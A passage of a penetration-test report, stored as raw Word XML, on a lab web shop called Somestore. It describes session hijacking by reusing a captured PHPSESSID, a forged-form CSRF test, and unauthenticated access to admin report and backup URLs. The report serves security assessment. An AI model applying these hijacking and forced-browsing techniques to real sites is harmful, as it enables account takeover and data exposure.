    <w:p w14:paraId="163019D7" w14:textId="0784D8E7" w:rsidR="00CF7DF4" w:rsidRDefault="00DB29BC" w:rsidP="00F1351D">
      <w:r>
        <w:t>During</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t xml:space="preserve"> testing</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to discover</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t xml:space="preserve"> if the</w:t>
      </w:r>
      <w:r w:rsidR="00DB0EC0">
        <w:t xml:space="preserve"> users’</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t xml:space="preserve"> session is still active after </w:t>
      </w:r>
      <w:r w:rsidR="00292B0A">
        <w:t>logging</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> out</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t xml:space="preserve"> it was found that the secret cookie was not removed from </w:t>
      </w:r>
      <w:r w:rsidR="008C6255">
        <w:t>the headers. However,</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t xml:space="preserve"> when attempting to access the </w:t>
      </w:r>
      <w:r w:rsidR="008C6255">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t>my details</w:t>
      </w:r>
      <w:r w:rsidR="008C6255">
        <w:t>”</w:t>
      </w:r>
      <w:r w:rsidR="00284548">
        <w:t xml:space="preserve"> page, </w:t>
      </w:r>
      <w:r w:rsidR="008C6255">
        <w:t xml:space="preserve">the page loaded successfully, but no personal details from the user were </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>disclosed</w:t>
      </w:r>
      <w:r w:rsidR="008C6255">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00E641CE">
        <w:t xml:space="preserve"> This suggests that the secret cookie is not used to </w:t>
      </w:r>
      <w:r w:rsidR="004A1873">
        <w:t>remember</w:t>
      </w:r>
      <w:r w:rsidR="00E641CE">
        <w:t xml:space="preserve"> what user is logged in, but simply contains the information about the user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D8C09A5" w14:textId="47F83F56" w:rsidR="00DB29BC" w:rsidRDefault="008C6255" w:rsidP="00F1351D">
      <w:r>
        <w:t xml:space="preserve">Due </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t xml:space="preserve">to the http-only flag not being set, and the cookies being transmitted over http, they are vulnerable to interception and modification. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01C2E196" w14:textId="1BB4EF89" w:rsidR="007F39B5" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Testing for Session Hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B771D29" w14:textId="0F9D3241" w:rsidR="00DB29BC" w:rsidRDefault="00DB29BC" w:rsidP="00F1351D">
      <w:r>
        <w:t>Sessi</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>on h</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ijacking </w:t>
      </w:r>
      <w:r w:rsidR="00B5063C">
        <w:t xml:space="preserve">using the ‘secret cookie’ </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">is not necessary as if the attacker knows the secret cookie, then they can gain the username and password. However, </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>session hijacking was still attempted using the secret cookie</w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t xml:space="preserve"> to see if it is possible</w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22891426" w14:textId="22585EAD" w:rsidR="00F82FB4" w:rsidRDefault="00D252D2" w:rsidP="00F1351D">
      <w:r>
        <w:t xml:space="preserve">A cookie was captured when attempting to login as the </w:t>
      </w:r>
      <w:hyperlink r:id="rId67" w:history="1">
        <w:r w:rsidRPr="00472BC1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> account. This cookie was </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>obtained</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, decoded, and edited. The username and password were edited to </w:t>
      </w:r>
      <w:r w:rsidR="00405E5E">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:hyperlink r:id="rId68" w:history="1">
        <w:r w:rsidR="00405E5E" w:rsidRPr="00472BC1">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Aboruc@gmail.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00405E5E">
        <w:t xml:space="preserve"> credentials</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and the timings at the end </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t>were kept</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the same. </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>This new cookie was then encrypted</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and replaced the </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>original</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> cookie. </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t xml:space="preserve">When the page was refreshed, the hacklab user was still logged in, meaning that the account did not update to the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00E4158A">
        <w:t>Aboruc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00E4158A">
        <w:t xml:space="preserve"> account, and the session did not fail.</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00CF7DF4">
        <w:t xml:space="preserve">Therefore, the secret cookie is not used to create the session for each user. </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>The secret cookie does not appear to be essential for the workings of the application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C827A35" w14:textId="21FEC242" w:rsidR="00B5063C" w:rsidRDefault="007F39B5" w:rsidP="00F1351D">
      <w:r>
        <w:t>The PHPSESSID is also uni</w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>que to each user, with a new ID</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> generated every time the user logs in.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50EC3955" w14:textId="2C0FA6F5" w:rsidR="00B5063C" w:rsidRDefault="00CF7DF4" w:rsidP="00F1351D">
      <w:r>
        <w:t>Session Hijacking</w:t>
      </w:r>
      <w:r w:rsidR="00B5063C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00EF7CC6">
        <w:t>will also be</w:t>
      </w:r>
      <w:r w:rsidR="00B5063C">
        <w:t xml:space="preserve"> attempted using the PHPSESSID. </w:t>
      </w:r>
      <w:r w:rsidR="00EF7CC6">
        <w:t xml:space="preserve">A PHPSESSID cookie is captured from logging in as the hacklab user on the </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>Google C</w:t>
      </w:r>
      <w:r w:rsidR="00EF7CC6">
        <w:t>hrome browser. This cookie has the value of “</w:t>
      </w:r>
      <w:r w:rsidR="00EF7CC6" w:rsidRPr="00EF7CC6">
        <w:t>kg8g7omjq9lmdhsg484h5599d1”</w:t>
      </w:r>
      <w:r w:rsidR="00EF7CC6">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1D13F6" w14:textId="01FECBDB" w:rsidR="00EF7CC6" w:rsidRDefault="00EF7CC6" w:rsidP="00F1351D">
      <w:r>
        <w:t>The Somestore web applicat</w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>ion is then connected to using Firefox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>On the Firefox browser, the user is not logged in. Using the tool Cookies M</w:t>
      </w:r>
      <w:r>
        <w:t>anager+</w:t>
      </w:r>
      <w:r w:rsidR="00016B98">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00016B98" w:rsidRPr="00016B98">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve">(Cookie Manager – Get this Extension for </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>Firefox</w:t>
      </w:r>
      <w:r w:rsidR="00016B98" w:rsidRPr="00016B98">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t xml:space="preserve"> (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00016B98" w:rsidRPr="00016B98">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00016B98" w:rsidRPr="00016B98">
        <w:rPr>
          <w:i/>
        </w:rPr>
        <w:t>-US), 2018)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, the PHPSESSID on </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>Firefox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is replaced with the cookie acquired </w:t>
      </w:r>
      <w:r w:rsidR="00016B98">
        <w:t>previously</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> from the hacklab use</w:t>
      </w:r>
      <w:r w:rsidR="00016B98">
        <w:t>r. This can be seen in Figure 19</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6797BD3E" w14:textId="77777777" w:rsidR="00EF7CC6" w:rsidRDefault="00EF7CC6" w:rsidP="00EF7CC6">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="44CB2F4F" wp14:editId="41E2CC3B">
            <wp:extent cx="5324475" cy="32289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24475" cy="3228975"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7C15A4" w14:textId="51982858" w:rsidR="00EF7CC6" w:rsidRDefault="00EF7CC6" w:rsidP="00EF7CC6">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19</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t>- session hijacking</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1E1E2A" w14:textId="55DF99FD" w:rsidR="007F39B5" w:rsidRDefault="00EF7CC6" w:rsidP="00EF7CC6">
      <w:r>
        <w:t xml:space="preserve">After refreshing the </w:t>
      </w:r>
      <w:r w:rsidR="00E4158A">
        <w:t>Firefox</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> browser with the new PHPSESSID cookie, the application logs in as the </w:t>
      </w:r>
      <w:hyperlink r:id="rId70" w:history="1">
        <w:r w:rsidRPr="00F00572">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> user</w:t>
      </w:r>
      <w:r w:rsidR="00B11DF0">
        <w:t>, giving full access to the hacklab account</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This means that session hijacking is possible, and only the PHPSESSID is required. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD9F11B" w14:textId="2F910DE6" w:rsidR="007F39B5" w:rsidRPr="00EF7CC6" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Testing for CSRF</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="199F01D8" w14:textId="6E4A1106" w:rsidR="006D6BB7" w:rsidRDefault="007F39B5" w:rsidP="00F1351D">
      <w:r>
        <w:t>Testing for CSRF was undertaken on the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page. A form was created that was</w:t>
      </w:r>
      <w:r w:rsidR="00016B98">
        <w:t xml:space="preserve"> near</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> identical to the form used on the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>process.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page. Th</w:t>
      </w:r>
      <w:r w:rsidR="00016B98">
        <w:t>is form can be seen in Figure 20</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A08737B" w14:textId="77777777" w:rsidR="007F39B5" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E0E703B" wp14:editId="283EDA7D">
            <wp:extent cx="5943600" cy="22606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260600"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D3B3F36" w14:textId="0F043863" w:rsidR="007F39B5" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">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20</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - CSRF form</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A938721" w14:textId="2C966AC1" w:rsidR="007F39B5" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">
      <w:r>
        <w:t>Upon opening this newly created html form, the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>index.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page was loaded – like it would normally when the /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>InsertPayment.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> page is called. To check if the request was submitted correctly, the database was looked at on the admin page. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE9280A" w14:textId="77777777" w:rsidR="007F39B5" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">
      <w:pPr>
        <w:keepNext/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="en-GB" w:eastAsia="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4F579EE3" wp14:editId="2726BFC0">
            <wp:extent cx="6711224" cy="971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15821" cy="972216"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="00D3D73E" w14:textId="1CC1D501" w:rsidR="007F39B5" w:rsidRDefault="007F39B5" w:rsidP="007F39B5">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21</w:t>
      </w:r>
      <w:r w:rsidR="00AE0968">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Updated Database</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BA774E0" w14:textId="66B71050" w:rsidR="007F39B5" w:rsidRPr="007F39B5" w:rsidRDefault="00F61CAD" w:rsidP="007F39B5">
      <w:r>
        <w:t>Figure 21</w:t>
      </w:r>
      <w:r w:rsidR="007F39B5">
        <w:t xml:space="preserve"> shows the database of all the customer orders. It has been successfu</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">lly updated with the order that was </w:t>
      </w:r>
      <w:r w:rsidR="007F39B5">
        <w:t>sent in the CSRF f</w:t>
      </w:r>
      <w:r w:rsidR="00B219CF">
        <w:t>orm, proving that the site is vulnerable to CSRF.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E82C8D6" w14:textId="123B0B84" w:rsidR="00405E5E" w:rsidRDefault="00405E5E" w:rsidP="00405E5E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="28" w:name="_Toc531104347"/>
      <w:r>
        <w:t>Test Access Controls</w:t>
      </w:r>
      <w:bookmarkEnd w:id="28"/>
    </w:p>
    <w:p w14:paraId="7E358AC2" w14:textId="38CAF8DB" w:rsidR="00405E5E" w:rsidRDefault="00405E5E" w:rsidP="00405E5E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="29" w:name="_Toc531104348"/>
      <w:r>
        <w:t>Understand the Access Control Requirements</w:t>
      </w:r>
      <w:bookmarkEnd w:id="29"/>
    </w:p>
    <w:p w14:paraId="5DB9B742" w14:textId="2E495DA4" w:rsidR="00405E5E" w:rsidRDefault="00405E5E" w:rsidP="00405E5E">
      <w:r>
        <w:t xml:space="preserve">The Somestore web application employs </w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t xml:space="preserve">horizontal </w:t>
      </w:r>
      <w:r w:rsidR="009035C2">
        <w:t xml:space="preserve">and </w:t>
      </w:r>
      <w:r>
        <w:t>vertical segregation. There ar</w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t>e two types of users,</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>a customer and an</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> admin. The admin users are able to view all the information contained on the website, including </w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>customer’s</w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t xml:space="preserve"> acc</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t xml:space="preserve">ount details, any order details and </w:t>
      </w:r>
      <w:r w:rsidR="00E158B7">
        <w:t xml:space="preserve">the </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>company reports. In addition to this</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t xml:space="preserve"> admins</w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t xml:space="preserve"> can add Employees, Produc</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>ts, Categories and Warehouses. Customers</w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t xml:space="preserve"> are able to </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t xml:space="preserve">login, </w:t>
      </w:r>
      <w:r w:rsidR="00687D9E">
        <w:t xml:space="preserve">view and change their own set of personal details. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A5CE24E" w14:textId="0D100074" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="00405E5E">
      <w:r>
        <w:t xml:space="preserve">In order to test if user authentication is correctly carried out, the </w:t>
      </w:r>
      <w:hyperlink r:id="rId73" w:history="1">
        <w:r w:rsidRPr="002F7AC0">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>hacklab@hacklab.com</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00F61CAD">
        <w:t xml:space="preserve"> user will </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>log in</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>and</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> at</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>tempt to access the admin pages by</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t xml:space="preserve"> using the admin URLs. The</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>URLs for admin specific areas are</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56F8CA99" w14:textId="77777777" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/admin/customerTable.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="218124DA" w14:textId="77777777" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>http://192.168.1.10/admin/order.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726F8DCB" w14:textId="77777777" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/admin/add_category.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C9F9357" w14:textId="77777777" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/admin/add_warehouse.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E44E57" w14:textId="77777777" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/admin/add_product.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="619E425C" w14:textId="77777777" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>http://192.168.1.10/admin/Employee.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F64ACB3" w14:textId="353CD51A" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F61CAD">
        <w:t>http://192.168.1.10/admin/ProductReport.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24420A5F" w14:textId="33378FED" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F61CAD">
        <w:t>http://192.168.1.10/admin/CustomerReport.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1494B2F5" w14:textId="67A8FB5A" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F61CAD">
        <w:t>http://192.168.1.10/admin/EmployeeReport.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27A22FAE" w14:textId="3086ED1E" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F61CAD">
        <w:t>http://192.168.1.10/admin/OrderReports.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="695A557B" w14:textId="0882D01D" w:rsidR="009035C2" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="00F61CAD">
        <w:t>http://192.168.1.10/admin/Backup.php</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067CDACA" w14:textId="0C64DC1B" w:rsidR="00C25217" w:rsidRDefault="009035C2" w:rsidP="009035C2">
      <w:r>
        <w:t xml:space="preserve">After testing all the URLs, the hacklab user was </w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t>un</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">able to gain access to the </w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t>first six pages</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00F82FB4">
        <w:t xml:space="preserve"> thus meaning that they were unable to</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t xml:space="preserve"> add,</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t xml:space="preserve"> update</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t xml:space="preserve"> or remove</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t xml:space="preserve"> any </w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t>of the categories, product</w:t>
      </w:r>
      <w:r w:rsidR="00000FCE">
        <w:t>s, warehouses or e</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t>mployees, and they couldn’t view the Cust</w:t>
      </w:r>
      <w:r w:rsidR="00E158B7">
        <w:t>omer T</w:t>
      </w:r>
      <w:r w:rsidR="00F61CAD">
        <w:t>able or Employee page</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t>. However, the user was able to gain access t</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t xml:space="preserve">o all of the companies reports </w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t>and</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t xml:space="preserve"> could</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t xml:space="preserve"> backup the server. This means that </w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t>for access to these pages</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t xml:space="preserve">, the server is not authenticating the users </w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
        <w:t>correctly</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B039B0F" w14:textId="63AB585C" w:rsidR="009035C2" w:rsidRDefault="00E158B7" w:rsidP="009035C2">
      <w:r>
        <w:t>Contained within the C</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t>usto</w:t>
      </w:r>
      <w:r>
        <w:t>mer R</w:t>
      </w:r>
      <w:r w:rsidR="00715727">
        <w:t>eport a</w:t>
      </w:r>
      <w:r w:rsidR="00C25217">
